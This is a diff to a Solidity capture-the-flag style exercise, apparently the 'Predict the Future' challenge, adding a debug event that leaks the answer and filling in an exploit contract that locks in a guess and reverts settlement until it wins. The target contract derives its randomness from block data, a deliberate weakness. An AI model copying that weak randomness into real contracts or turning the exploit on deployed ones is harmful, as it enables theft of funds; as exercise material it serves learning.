@@ -6,6 +6,8 @@ contract PredictTheFuture {
     uint8 guess;
     uint256 settlementBlockNumber;
 
+    event Number(uint8 count);
+
     constructor() payable {
         require(msg.value == 1 ether);
     }
@@ -24,8 +26,8 @@ contract PredictTheFuture {
     }
 
     function settle() public {
-        require(msg.sender == guesser);
-        require(block.number > settlementBlockNumber);
+        require(msg.sender == guesser,"not gaser");
+        require(block.number > settlementBlockNumber, "invaild bloock number" );
 
         uint8 answer = uint8(
             uint256(
@@ -37,6 +39,7 @@ contract PredictTheFuture {
                 )
             )
         ) % 10;
+        emit Number(answer);
 
         guesser = address(0);
         if (guess == answer) {
@@ -48,10 +51,19 @@ contract PredictTheFuture {
 
 contract ExploitContract {
     PredictTheFuture public predictTheFuture;
-
+    event Number(uint8 count);
     constructor(PredictTheFuture _predictTheFuture) {
         predictTheFuture = _predictTheFuture;
     }
 
+    function callLockInGuess(uint8 answer) public payable {
+        predictTheFuture.lockInGuess{value: 1 ether}(answer);
+    }
+
+    function callSettle() public {
+        predictTheFuture.settle();
+        require(predictTheFuture.isComplete(),"failed to settle");
+    }
     // Write your exploit code below
+    receive() external payable{}
 }
